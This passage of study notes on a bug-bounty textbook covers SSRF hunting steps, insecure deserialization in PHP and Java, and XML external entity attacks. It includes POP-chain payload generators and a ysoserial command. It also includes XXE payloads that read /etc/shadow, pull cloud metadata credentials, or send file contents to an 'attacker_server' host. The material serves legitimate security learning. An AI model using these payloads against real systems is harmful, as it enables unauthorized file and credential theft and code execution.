  - _Unrouted addresses_ cannot be reached from the current machine.
  - Short response times may indicated an unrouted address because the router might have dropped the request immediately.
  - Longer response times may indicate a port or address is active, but is being blocked by the firewall.
- The key is to look for differences in behavior (patterns) that may indicate if a port or address is being used.
- The target machine might also leak sensitive information in outbound requests, such as internal IPs, headers, and version numbers of the software being used.
- If you can't access an internal address, you can always try to provide the vulnerable endpoint with the address of a server you own and see what you can extract from the incoming request.

**Finding Your First SSRF**

1. Spot the features prone to SSRFs and take notes for future reference.
2. Set up a callback listener to detect blind SSRFs by using an online service or Burp's Collaborator feature.
3. Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener.
4. Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server.
5. In the case of a blind SSRF, check if the server behavior differs when you request different hosts or ports.
6. If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
7. Pick a tactic to escalate the SSRF.
8. Draft your first SSRF report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 14: Insecure Deserialization

"_Insecure Deserialization_ vulnerabilities happenw hen applications deserialize program object without proper precaution. An attack can then manipulate serialized object to change the program's behavior...They're hard to find and exploit, because they tend to look different depending on the programming language and livraries used to build the application. These bugs also require deep technical understanding and ingenuity to exploit. Although they can be a challenge to find, they are worth the effort. Countless write-ups describe how researches used these bugs to achieve RCE on critical assets from companies such as Google and Facebook."

**Mechanisms**

"_Serialization_ is the process by which some bit of data in a programming language gets converted into a format that allows it to be saved in a database or transferred over a network. _Deserialization_ refers to the opposite process, whereby the program reads the serialized object from a file or the network and converts it back into an object."

- Some objects in programming languages are difficult to transfer through a network or tore in a database without corruption.
  - Serialization and deserialization allow programming languages to reconstruct identical program objects in different computer environments.
  - Programming languages that support serialization and deserialization: Java, PHP, Python, Ruby.
- Devs usually trust user-supplied serialized data because it is difficult to read or unreadable to a user.
  - Attackers abuse this trust.
- To achieve an insecure deserialization vulnerability the attacker manipulates the serialized object to cause unintended consequences in the program.
  - Authentication bypass or RCE are common focuses for this type of attack.
  - ex. An application takes a serialized object from the user and uses the data contained within to determine who is logged in.
    - the attacker might be able to tamper with that object and authenticate as someone else.
    - If the application uses an unsafe deserialization operation, the attacker may also be able to embed code snippets in the object and get them to execute during deserialization (RCE).
- Learning how different programming languages implement serialization and deserialization is a great way to learn insecure deserialization attacks.
  - PHP: install php to run scripts in the command line or use an online PHP tester like [ExtendsClass](https://extendsclass.com/php.html)
    - Note\* not all online php testers support serialization and deserialization.
  - Java: Check if you have java installed with `java -version` in the command line, if you don't have it, you can install it following the instructions on their website [https://java.com/en/download/help/download_options.html](https://java.com/en/download/help/download_options.html)
    - You can also use an online Java compiler to test code: [Tutorials Point](https://www.tutorialspoint.com/compile_java_online.php)

_PHP_

- In the book the author mentions that about half of all the publicly disclosed insecure deserialization bugs were found in PHP.
  - Most Insecure Deserialization vulns are resolved as high-impact or critical-impact vulnerabilities.

Understanding how PHP serializes and deserializes objects:

- When an application needs to store a PHP object to transfer it over the network, it calls the PHP function `serialize()` to pack it up.
- When an application needs to use that data, it calls `unserialize()`

  - ex. snippet showing the serialize() process:
    ```
    <?php
      class User{
      public $username;
      public $status;
      }
      $user = new User;
      $user->username = 'hacker'
      $user->status = 'not admin';
      echo serialize($user);
    ?>
    ```
  - This code declares a class called `User`.

    - Each `User` object will contain a `$username` and a `$status` attribute.
    - It sets the attributes with the username and status required.
    - Finally, it serializes the `$user` object and prints out the string representing the serialized object.
    - Save the code as serialize_test.php and run it with `php serialize_test.php`
      - output: `O:4:"User":2:{s:8:"username";s:6:"hacker";s:6:"status";s:9:"not admin";}`

  - The basic structure of a PHP serialized string is `data type:data`.

    - Types of data:
      - b:THE_BOOLEAN;
      - i:THE_INTEGER;
      - d:THE_FLOAT;
      - s:LENGTH_OF_STRING:"ACTUAL_STRING";
      - a:NUMBER_OF_ELEMENTS:{ELEMENTS}
      - 0:LENGTH_OF_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}

  - ex. snippet showing the unserialize() process:

    ```
    <?php
      class User{
        public $username;
        public $status;
      }
      $user = new User;
      $user->username = 'hacker';
      $user->status = 'not admin';
      $serialized_string = serialize($user);

      $unserialized_data = unserialize($serialized_string);
      var_dump($unserialized_data);
      var_dump($unserialized_data["status"]);
    ?>

    ```

  - The first 8 lines of code (after <php) create a yser object, serialize it, and store the serialized string to the variable `$serialized_string`.
  - It then deserializes the variable `$serialized_string` and stores the restored object into the variable `$unserialized_data`.
  - `var_dump()` is a PHP function that displays the value of a variable.
  - the last two lines display the value of the deserialized object `$unserialized_data` and it's status property.
    - **This code snippet is exactly as seen in the book, but it will throw an error** because it's trying to access a property of an object using an array syntax, this is not allowed in PHP.
    - The correct way to access properties of objects is with arrow syntax. So the last line `var_dump($unserialized_data["status"]);` should be changed to `echo $unserialized_data->status;`, I've captured this is the sub directory /Scripts where you can find the examples of code from this book.
  - Some programming languages also allow devs to serialize into other standardized formats, such as JSON and YAML.

_Controlling Variable Values_

- If the serialized object isn't encrypted or signed, anyone can create a `User` object.
  - This is a common way insecure deserialization endangers applications.
- Some applications pass in a serialized object as a method of euthentication without encrypting or signing it because they think serialization alone will stop users from tampering with the values.
  - If this is the case, you can mess with the values encoded in the serialized string:
  ```
  <?php
    class User{
      public $username;
      public $status;
    }
    $user = new User;
    $user->username = 'hacker';
    $user->status = 'admin';
    echo serialize($user);
  ?>
  ```
  - The above shows changing the status from `'not admin'` to `'admin'`.
  - To do this, you would intercept the outgoing request in your proxy and insert the new object in place of the old one.
    - check if you get admin privileges to confirm.
  - You could also change your serialized string directly to: `O:4:"User":2:{s:8:"username";s:6:"hacker";s:6:"status";s:5:"admin";}`
    - Note\* you could need to change the s:5 as well as the "admin"

_unserialize() Under the Hood_

- To better understand how `unserialize()` can lead to RCEs, you need to know how PHP creates and destroys objects.
- PHP _magic methods_ are method names in PHP that have special properties.
  - If the serialized object's class implements any method with a magic name, these methods will have magic properties, such as being automatically run during certain points of execution, or when certain conditions are met.
  - Two of these magic methods are `__wakeup()` and `__destruct()`.
    - `__wakeup()` method is used during instantiation when the program creates an instance of a class in memory, which is what `unserialize()` does; it takes the serialized string, which specifies the class and the properties of that object, and uses that data to create a copy of the originally serialized object. It then searches for the `__wakeup()` method and executes code in it.
      - The `__wakeup()` method is usually used to reconstruct any resources that the object may have, reestablish any database connections that were lost during the serialization, and perform other reinitialization tasks.
      - It is often used during a PHP object injection attack because it provides a convenient entry point to the server's database or other functions in the program.
      - The program then operates on the object and uses it to perform other actions.
    - When no references to the deserialized object exists, the program calls the `__destruct()` function to clean up the object.
      - This method often contains useful code in terms of exploitation.
      - ex. If as `__destruct()` method contains code that deletes and cleans up files associated with the object, the attacker might be able to mess with the integrity of the filesystem by controlling the input passed into these functions.

_Using POP Chains_

- When attackers control a serialized object passed into `unserialize()`, they can control the properties of the created object. This gives them the opportunity to hijack the flow of the application by choosing the values passed into magic methods like `__wakeup()`
  - This is not always effective. If the declared magic methods of the class don't contai any useful code in terms of exploitation, for example, the available classes for object injections contain only a few methods, and none of them contain code injection opportunities, then the unsafe deserialization is useless.
- Another way of achieving RCE, even in the above scenario is using POP chains.

  - _Property-oriented programming (POP) chain_ is a type of exploit whose name comes from the fact that the attacker controls all of the deserialized object's properties.
  - POP chains work by stringing bits of code together, called _gadgets_, to achieve the attacker's ultimate goal.
  - These gadgets are code snippets borrowed from the codebase.
  - POP chains use magic methods as their initial gadget.
  - Attackers can then use these methods to call other gadgets.
  - ex. from [https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection).

  ```
  class Example
  {
    private $obj;
    function __construct()
    {
      // some PHP code...
    }
    function __wakeup()
    {
      if (isset($this->obj)) return $this->obj->evaluate();
    }
  }

  class CodeSnippet
  {
    private $code;

    function evaluate()
    {
    eval($this->code);
    }
  }

  // some PHP code...

  $user_data = unserialize($_POST['data']);

  // some PHP code...
  ```

  - In this application, the code defines two classes: `Example` and `CodeSnippet`.
    - `Example` has a property named `obj`, and when an `Example` object is deserialized, its `__wakeup()` function is called, which calls `obs`'s `evaluate` method.
    - `CodeSnippet` class has a property named `code` that contains the code string to be executed and an `evaluate()` method, which calls `eval()` on the `code` string.
    - In another part of the code, the program accepts the POST parameter `data` from the user and calls `unserialize()` on it.
    - Since that last line contains an insecure deserialization vulnerability, an attacker can use the following code to generate a serialized object:
    ```
    class CodeSnippet
    {
    private $code = "phpinfo();";
    }
    class Example
    {
      private $obj;
      function __construct()
      {
        $this->obj = new CodeSnippet;
      }
    }
    print urlencode(serialize(new Example));
    ```
    - This code snippet defines a class named `CodeSnippet` and sets its code property to `phpinfo();`.
    - Then it defines a class named `Example`, and sets its `obj` property to a new `CodeSnippet` instance on instantiation.
    - Finally, it creates an `Example` instance, serialized it, and URL-encodes the serialized string.
      - The attacker can then feed the generated string into the POST parameter `data`.
      - Notice that the attacker's serialized object uses class and property names found elsewhere in the application's source code.
        - As a result, the program will do the following when it receives the crafted `data` string.
        - First, it will unserialize the object and create an `Example` instance.
        - Then, since `Example` implements `__wakeup()`, the program will call `__wakeup()` and see that the `obj` property is set to a `CodeSnippet` instance.
        - Finally, it will call the `evaluate()` method of the `obj`, which runs `eval("phpinfo();")`, since the attacker set the `code` property to `phpinfo()`.
        - The attacker is able to execute any PHP code of their choosing.
  - POP chains achieve RCE by chaining and reusing code found in the application's codebase.

  - ex. How to use POP chains to achieve SQL injection from [https://owasp.org/www-community/vulnerabilities/PHP_Object_injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_injection).
  - In this example, an application defines a class called `Example3` somewhere in the code and deserializes unsanitized user input from the POST parameter `data`:

  ```
  class Example3
  {
    protected $obj;
    function __construct()
    {
      // some PHP code...
    }
    function __toString()
    {
      if (isset($this->obj)) return $this->obj->getValue();
    }
  }

  // some PHP code...

  $user_data = unserialize($_POST['data']);

  // some PHP code...
  ```

  - Notice the `Example3` implements the `__toString()` magic method.
    - In this case, when an `Example3` instance is treated as a string, it will return the result of the `getValue()` method run on its `$obj` property.
  - Let's also say that, somewhere in the application, the code defines the class `SQL_Row_Value`. It has a method named `getValue()`, which executes an SQL query. The SQL query takes input from the `$_table` property of the `SQL_Row_Value` instance:

  ```
  class SQL_Row_Value
  {
    private $_table;
    // some PHP code...
    function getValue($id)
    {
      $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
      $result = mysql_query($sql, $DBFactory::getConnection());
      $row = mysql_fetch_assoc($result);
  return $row['value'];
    }
  }
  ```

  - An attacker can achieve SQL injection by controlling the `$obj` in `Example3`.
  - The following code will create an `Example3` instance with `$obj` set to a `SQL_Row_Value` instance, and with `$_table` set to the string "SQL Injection":

  ```
  class SQL_Row_Value
  {
    private $_table = "SQL Injection";
  }
  class Example3
  {
    protected $obj;
    function __construct()
    {
      $this->obj = new SQL_Row_Value;
    }
  }
  print urlencode(serialize(new Example3));
  ```

  - As a result, whenever the attacker's `Example3` instance is treated as a string, its `$obj`'s `get_Value()` method will be executed.
    - This means the `SQL_Row_Value`'s `get_Value()` method will be executed with the `$_table` string set to "SQL Injection".
  - The attacker has achieved a limited SQL injection, since they can control the string passed into the SQL query `SELECT * FROM {$this->_table} WHERE id= " . (int)$id;`.
  - POP chains are similar to _return-oriented programming_ (ROP) attacks, and interesting technique used in binary exploitation.
    - you can read more about it on [Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming)

_Java_

"Java applications are prone to insecure deserialization vulnerabilities because many of them handle serialized objects... For Java objects to be serializable, their classes must implement the `java.io.Serializable` interface. These classes also implement special methods, `writeObject()` and `readObject()`, to handle the serilization and deserialization, respectively, of object of that class."

ex. [SerializeTest.java](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/InsecureDeserialization/Java/SerializeTest.java):

```
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.io.IOException;

class User implements Serializable{
  public String username;
}

public class SerializeTest{

  public static void main(String args[]) throws Exception{

    User newUser = new User();
    newUser.username = "hacker";

    FileOutputStream fos = new FileOutputStream("object.ser");
    ObjectOutputStream os = new ObjectOutputStream(fos);
    os.writeObject(newUser);
    os.close();

    FileInputStream is = new FileInputStream("object.ser");
    ObjectInputStream ois = new ObjectInputStream(is);
    User storedUser = (User)ois.readObject();
    System.out.println(storedUser.username);
    ois.close();
  }
}
```

- To compile this code: `javac SerializeTest.java`
- To run this code: `Java SerializeTest`
  - When you run the code, it should output the username: `hacker`
- Only classes that implement Serializable can be serialized and deserialized.
- To exploit Java applications via an insecure deserialization bug, we first have to find an entry point through which to insert the malicious serialized object. In Java applications, serializable objects are often used to transport data in HTTP headers, parameters, or cookies.
- Java serialized objects are not human readable like PHP serialized strings, They often contain non-printable characters as well. But they do have a couple of signatures that can help you recognize them and find potential entry points for your exploits:
  - Starts with `AC ED 00 05` in hex or `rO0 in base 64`. (You might see these within HTTP requests as cookies or parameters.)
  - The `Content-Type` header of an HTTP message is set to `application.x-java-serialized-object`.
- Java serialized objects are often encoded before transmission.
  - Look for encoded versions of these signatures as well.
- Once you've found a user-supplied serialized object, try manipulating program logic by tampering with the information stored within the objects.
  - If used as a cookie for access control:
    - Change usernames
    - Change roll names
    - Change identity markers that are present in the object
      - Re-serialize the object and relay it back to the application via your proxy.
  - Additional things to tamper with in the object:
    - file paths
    - file specifier
    - control flow value to see if you can alter the program's flow.
- If the code doesn't restrict which classes the application is allowed to deserialize, it can deserialize any serializable classes to which it has access.
  - This means attackers can create their own objects of any class.
  - An attacker can achieve RCE by constructing objects of the right classes that can lead to arbitrary command execution.

_Achieving RCE_

- The path from a Java deserialization bug to RCE can be convoluted. To gain code execution, you often need to use a series of gadgets to reach the desired method for code execution. This works similarly to exploiting deserialization bugs using POP chains in PHP - Look back at examples of POP chains.
- In Java applications, you'll find gadgets in the libraries loaded by the application. Using gadgets that are in the application's scope, create a chain of method invocations that eventually leads to RCE.
- Finding and chaining gadgets to formulate an exploit can be time-consuming. You're also limited to the classes available to the applications, which can restrict what your exploits can do.
  - To save time, try creating exploit chains by using gadgets in popular libraries, such as the Apache Commons-Collections, the Spring Framework, Apache Groovy, and Apache Commons FileUpload.
    - You'll find many of these published online.

_Automating the Exploitation by Using Ysoserial_

- [Ysoserial](https://github.com/frohoff/ysoserial/) is a tool that can be used to generate payloads that exploit Java insecure deserialization bugs, saving tons of time by creating gadget chains for you.
- Ysoserial uses a collection of gadget chains discovered in common Java libraries to formulate exploit objects. With Ysoserial, you can create malicious Java serialized objects that use gadget from specified libraries with a single command:
  `java -jar ysoserial.jar <gadget_chain> <command_to_execute>`
  - ex: create a payload that uses a dadget chain in the Commons-Collections library to open a calculator on the target host:
    `java -jar ysoserial.jar CommonsCollections1 calc.exe`
- The program takes the command you specified and generates a serialized object that executes that command.
- Sometimes the gadget chain will seem obvious, but often it's a matter of trial and error, as you'll have to discover which vulnerable libraries your target application implements. This is where good reconnaissance will help you.
- Another resource for exploiting Javascript deserialization on [GitHub](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/)

**Prevention**

- Defending against deserialization vulnerabilities is difficult.
  - The best way to protect against these vulns varies greatly based on the programming language, libraries, and serialization format used.
    - There is really no one-size-fits-all solution.
- Make sure not to deserialize any data tainted by user input without proper checks.
  - If deserialization is necessary, use an allowlist to restrict deserialization to a small number of allowed classes.
- You can also use simple data types, like strings and arrays, instead of objects that need to be serialized when being transported.
- To prevent the tampering of serizlized cookies, you can keep track of the session state on the server instead of relying on user input for session infromation.
- You should keep an eye out for patches and make sure your dependencies are up-to-date to avoid introducing deserialization vulns via third-party code.
- Some developers may try to mitigate deserialization vulnerabilities by identifying the commonly vulnerable classes and removing them from the application.
  - This effectively restricts available gadgets attackers can use in gadget chains.
  - This isn't a reliable form of protection. Limiting gadgets can be a great layer of defense, but hackers are creative and can always find more gadgets in other libraries.
- It's important to address the root cause of of the vuln: The application deserializes user data insecurely.
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

_Hunting for Insecure Deserialization_

"Conducting a source code review is the most reliable way to detect deserialization vulnerabilities. From the examples in this chapter, you can see that the fastest way to find insecure deserialization vulnerabilities is by searching for deserialization functions in source code and checking if user input is being passed into it recklessly. For example, in a PHP application, look for `unserialize()`, and in a Java application, look for `readObject()`. In python and Ruby applications, look for the functions `pickle.loads()` and `Marshall.load()`, respectively."

- Strategies to find deserialization vulns without examining code:
  - Look for large blobs of data passed into an application. - A base64 string being passed into an application: `MDo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImhhY2tlciI7czo2OiJzdGF0dXMiO3M6
OToibm90IGFkbWluIjt9Cg==` which represents `0:4:"User":2:{s:8:"username";s:6:"hacker";s:6:"status";s:9:"not admin";}` in base64.
  - Large blobs could be serialized objects that represent object injection opportunities.
    - Try to decode these blobs to investigate what they are.
    - Most will be base64.
  - Pay attention to the `Content-Type` header of an HTTP request or response.
    - `Content-Type` set to `application/x-java-serialized-object` indicates that the application is passing information via Java serialized objects.
  - Search for features that may have to deserialize objects supplied by the user, such as database inputs, authentication tokens, and HTML form parameters.
    - Once you've found a user supplied serialized object, you need to determine the type of serialized object it is:
      - PHP object, Python object, Ruby object, or Java object.
      - Look through the languages docs to find the structure of serialized objects.

**Escalating the Attack**

- The impact of insecure deserialization can be limited when the vulnerability relies on an obscured point of entry, or requires a certain level of application privilege to exploit, or if the vulnerable function isn't available to unauthenticated users.
- Make sure to take the scope and Rules of Engagement into account!
- Deserialization vulns can be dangerous so make sure not to cause damage to the target application when manipulating program logic or executing arbitrary code.

**Finding Your First Insecure Deserialization!**

1. If you can get access to an application's source code, search for deserialization functions in the source code that accept user input.
2. If you cannot get access to source code, look for large blobs of data passed into an application. These could indicate serialized objects that are encoded.
3. Alternatively, look for features that might hve to deserialize objects supplied by the user, such as database inputs, authentication tokens, and HTML form parameters.
4. If the serialized object contains information about the identity of the user, try tampering with the serialized object found and see if you can achieve authentication bypass.
5. See if you can escalate the flaw into a SQL injection or remote code execution. Be extra careful not to cause damage to your target application or server.
6. Draft your first insecure deserialization report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 15: XML External Entity

"XML _external entity attacks (XXEs)_ are fascinating vulnerabilities that target the CML parsers of an application. XXEs can be very impactful bugs, as they can lead to confidential information disclosure, SSRFs and DoS attacks. Bu thtye are also difficult to understand and exploit."

- Chapter goes over how to use XXEs to extract sensitive files on the target system, launch SSRFs, and trigger DoS attacks.

**Mechanisms**

"_Extensible Markup Language (XML)_ is designed for storing and transporting data. This markup language allows developers to define and represent arbitrary data structures in a text format using a tree-line structure like that of HTML."

- ex. Applications use CML to transport identity information in Security Assertion Markup Language (SAML). The XML can look like this:
  ```
  <saml:AttributeStatement>
    <saml:Attribute Name="username">
      <saml:AttributeValue>
        hacker
      </saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
  ```
- Unlike HTML, XML has user-defined tag names that let you structure the XML document freely.
  - XML is widely used in web application functionalities like: authentication, file transfers, image uploads, or simply to transfer HTTP data from the client to the server and back.
- XML documents can contain a _document type definition (DTD)_, which defines the structure of an XML document and the data it contains.
  - These DTD can be laoded from external sources or declared in the document itself within a `DOCTYPE` tag.
  - ex. DTD that defines an CML entity called `file`:
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE example [
      <!ENTITY file "hello!">
    ]>
    <example>&file;</example>
    ```
- XML entities work like variables in programming languages: any time you reference this entity by using the syntax `&file`, the XML document will load the value of `file` in its place. So any reference of `&file` within the XML document will be replaced by "Hello!".
- XML documents can also use _external entities_ to access either local or remote content with a URL.
  - If an entity's value is preceded by a `SYSTEM` keyword, the entity is an external entity, and it's value will be loaded from the URL.
  - ex. The following DTD declares an external entity named `file` is the contents of `file:///example.txt` on the local file system:
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE example [
      <!ENTITY file SYSTEM "file:///example.txt">
    ]>
    <exmaple>&file;</example>
    ```
    - The last line loads the file entity in the XML document, referencing the contents of the .txt file located at `file:///example.txt`.
- External entities can also load resources from the internet.
  - ex.
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE example [
      <!ENTITY file SYSTEM "http://example.com/index.html">
    ]>
    <example>&file;</example>
    ```
  - If users can control the values of XML entities or external entities, they could be able to disclose internal files, port-scan internal machines, or launch DoS attacks.
- Many sites use older or poorly configured XML parsers to read XML documents.
  - If the parser allows user-defined DTDs or user input within the DTD and is configured to parse and evaluate the DTD, attackers can declare their own external entities to achieve malicious results.
  - ex. If an application allows users to upload their own XML document, the app will parse and display the document back to the user:
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY file SYSTEM "file:///etc/shadow">
  ]>
  <example>&file;</example>
  ```
  - Parsing the XML file will cause the server to return the contents of /etc/shadow because the XML file includes the /etc/shadow via an external entity.
- Applications are vulnerable to XXE's when the application accepts user supplied XML input or passes user input into DTDs, which is then parsed by an XML parser, and that XML parser reads local system files or sends internal or outbound requests specified in the DTD.

**Prevention**

"Preventing XXE's is all about limiting the capabilities of an XML parser. First, because DTD processing is a requirement of XXE attacks, you should disable DTD processing on the XML parsers if possible. If it's not possible to disable DTDs completely, you can disable external entities, parameter entities..., and inline DTDs (DTDs included in the XML document)."

- To prevent XXE-based DoS attacks, you can limit the XML parser's parse time and parse depth. You can also disable the xpansion of entities entirely.
- If using the default PHP XML parser, you need to set `libxml_disable_entity_loader` to `True` in order to disable the use of external entities.
  - Consult the [OWASP Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md) for more information.
- Input validation is another prevention method.
  - Create an allow list for user-supplied values that are passed into XML documents, or sanitize potentially hostile data within XML documents, headers, or nodes.
  - Use less complex data formats like JSON instead of XML whenever possible.
- If the server takes XML input but does not return the XML document in an HTTP response (like in a classic XXE attack), attackers can use blind XXEs to exfiltrate data.
  - These XXE attacks steal data by having the target server make an outbound request to the attacker's server with the stolen data. To prevent Blind XXEs, disallow outbound network traffic.
- Review your dependencies: Many XXEs are introduced by an application's dependencies instead of its custom source code. Keep these up to date and review their source code if possible.

**Hunting for XXEs**

"To find XXE's, start with locating the functionalities that are prone to them. This includes anywhere that the application receives direct CML input, or receives input that is inserted into XML documents that the application parses."

_Step 1: Find XML Data Entry Points_

- Use a proxy to browse the target application then look for XML-like documents in HTTP messages by looking for the previously mentioned tree-like structures or by looking for signatures of an XML document "`<?cml`".
- Keep an eye out for base64 or URL-encoded XML data and decode them.
  - ex. base64-encoded blocks of HTML tend to start with `LD94bWw` which is base64-encoded "<?xml."
- Look for file-upload features.
  - By uploading xml files you might be able to smuggle XML into to the applications XML parser (if the application uses XML).
  - XML can be written into document and image formats: XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, and RSS feeds.
    - Metadata embedded within images: GIF, PNG, JPEG are all based on XML.
    - SOAP web services are also XML based.
- You may be able to force the application into parsing XML data by submitting it to an endpoint that accepts plain text or JSON input.
  - On endpoints that take other formats of input, modify the `Content-Type` header of your request to one of the following:
    `Content-Type: text/xml` or `Content-Type: application/xml`.
    - Then, include the XML data in your request body.
- If you suspect the application receives user-submitted data and embeds it into an XML document on the server side, you can submit an XInclude test payload to the endpoint (Step 5).

_Step 2: Test for Classic XXE_

"Once you've determined tha tht endpoints can be used to submit XML data, you can start to test for the presence of functionalities needed for XXE attacks. This involves sending a few trial-and-error XXE payloads and observing the application's response."

- If the app is returning results from the parser, you may be able to conduct a classic XXE attack.
  - You can read the leaked files directly from the server's response.
  - Check if XML entities are interpreted by inserting XML entities into the XML input and see if it loads properly:
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "Hello!">
  ]>
  <example>&test;</example>
  ```
  - Then test whether the `SYSTEM` keyword is usable by trying to load a local file:
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "file:///etc/hostname">
  ]>
  <example>&test;</example>
  ```
  - If the `SYSTEM` keyword doesn't work, replace it with the `PUBLIC` keyword instead.
    - This tag requires you to supply an ID surrounded by quotes after the `PUBLIC` keyword.
    - The parser uses this to generate an alternate URL for the value of the entity. For our purposes, you can just use a random string in its place:
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
  ]>
  <example>&test;</example?
  ```
  - Try to extract some common system files: `/etc/hostname`, `/etc/password`, `.bash_history`, `~/.bash_history`
    - Bash history can be pretty juicy depending on what the user you access has been up to.
    - Try to access files that are specific to the web apps architecture. Look up what files might be in the "/var/www/..." directories of the underlying tech.

_Step 3: Test for Blind XXE_

"If the server takes XML input but does not return the XML document in an HTTP response, you can test for a blind XXE instead... Most blind XXE attacks steal data by having the target server make a request to the attacker's server with the exfiltrated information."

- Make sure the server can make outbound requests to your server.
- Try making an external entity load a resource on your machine.
  - To bypass common firewall restrictions, test will port 80 and 443 first.
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
  ]>
  <example>&test;</example>
  ```
  - Search the logs of your server and look for a request to the particular file.
  - In this example you'll be looking for a GET request for the `xxe_test.txt` file.

_Step 4: Embed XXE Payloads in Different File Types_

"Besides testing for XXEs on HTTP request bodies, you can try to upload files containing XXE payloads to the server. File-upload endpoints and file parsers are often not protected by the same XXE protection mechanisms as regular endpoints... Hiding your XXE payloads in different file types means that you will be able to upload your payloads even if the application restricts the type of files that can be uploaded."

- To embed an XXE payload in an SVG image, open the image as a text file.

  - ex. An SVG file of a blue circle:

  ```
  <svg width="500" height="500">
    <circle cs="50" cy="50" r="40" fill="blue" />
  </svg>
  ```

  - Insert the XXE payload by adding a DTD directly into the file and referencing the external entity in the SVG image:

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "file:///etc/shadow">
  ]>
  <svg width="500" height="500">
    <circle cx="50" cy="50" r="40" fill="blue" />
    <text font-size="16" x="0" y="16">&test;</text>
  </svg>
  ```

- Microsoft Word (_.docx_), Powerpoint (_.pptx_), and Excel (_.xlsx_), are archive files containing XML files.
  - You can insert XXE payloads into them as well.
  - To do this, you need to unzip or unarchive the file then insert your payload into `/word/document.xml`, `/ppt/presentation.xml`, or `/xl/workbook.xml`
    - When you unarchive a DOCX file, you will see a few folders containing XML files.
    - To repack the file, cd into the directory containing the files are run `rip -r filename.format *`

_Step 5: Test for XInclude Attacks_

"Sometimes you cannot control the entire XML document or edit the DTD of an XML document. But you can still exploit an XXE vulnerability if the target application takes your user input and inserts it into XML documents on the backend. In this situation, you might be able to execute an XInclude attack instead. _XInclude_ is a special XML feature that builds a separate XML document from a single XML tag named _xi:include_."

- If you can control a single piece of unsanitized data passed into an XML documnt, you might be able to place an XInclude attack within the value.
  - To test, insert the following payload into the data entry point and see if the file you requests get sent back in the response body:
  ```
  <example xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hostname"/>
  </example>
  ```
  - This references the `http://www.w3.org/2001/XInclude` namespace so that we can use the `xi:include` element.
    - It then uses that element to parse and include the `/etc/hostname` file in the XML document.

**Escalating the Attack**

- What you can achieve depends on the permissions given to the XMl parser.
- XXEs can be used to access and exfiltrate system files, source code, and directory listings on the local machine.
- XXEs can be used to perform SSRF attacks to port-scan the target's internal network, read files on the network, and access resources that are hidden behind a firewall.
- XXEs could be used for DoS attacks.

_Reading Files_

- To read local files, place the local file's path into the DTD of the parsed XML file.
  - Local files can be accessed using the `file://` URL scheme followed by the file's path on the machine.
  - ex.
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY file SYSTEM "file:///etc/shadow">
  ]>
  <example>&file;</example>
  ```

_Launching an SSRF_

- You can launch a port scan by switching out the external entity's URL with different ports on the target machine. This is similar to the port-scanning technique mentioned in Chapter 13.
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY file SYSTEM "http://10.0.0.1:80">
  ]>
  <example>&file;</example?>
  ```
- You can also use XXEs to launch and SSRF to pull instance metadata:
  ```
  <?xml version"1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <example>&file;</example>
  ```
  - When trying to view unintended data like this, you should look for the exifltrated data by inspecting the page source code or HTTP response directly, rather than viewing the HTML page rendered by the browser, because the browser might not render the page correctly.
  - You can use the information gathered from network scanning and retrieving instance metadata to pivot into internal services.

_Using Blind XXEs_

- If the app doesn't return the XML parsing to the user, you may be able to exfiltrate the data to a server that you control by forcing the XML parser to make an external request with the desired data in the request URL.

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY file SYSTEM "file://etc/shadow">
    <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
  ]>
  <example>&exiltrate;</example>
  ```

  - The above probably won't work because most parsers do not allow external entities to be included in other external entities.
    - Parsers would stop processing the DTD once they encounter the line `<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">`
    - Exiltrating data using an XXE is a bit more complicated than a classic XXE (not blind).
